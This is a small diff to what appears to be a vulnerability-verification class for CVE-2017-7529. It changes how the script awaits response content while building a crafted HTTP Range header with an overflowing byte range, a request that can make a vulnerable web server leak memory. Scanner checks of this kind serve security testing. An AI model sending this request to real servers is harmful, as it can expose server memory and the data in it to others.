@@ -38,7 +38,7 @@ class CVE_2017_7529_BaseVerify:
         
         try:
             check_req = await request.get(self.url, headers = self.headers)
-            start = len(check_req.content) + 605
+            start = len(await check_req.content) + 605
             end = 0x8000000000000000 - start
             self.headers["Range"] = "bytes=-{},-{}".format(start, end)
             cmd_req = await request.get(self.url, headers = self.headers )
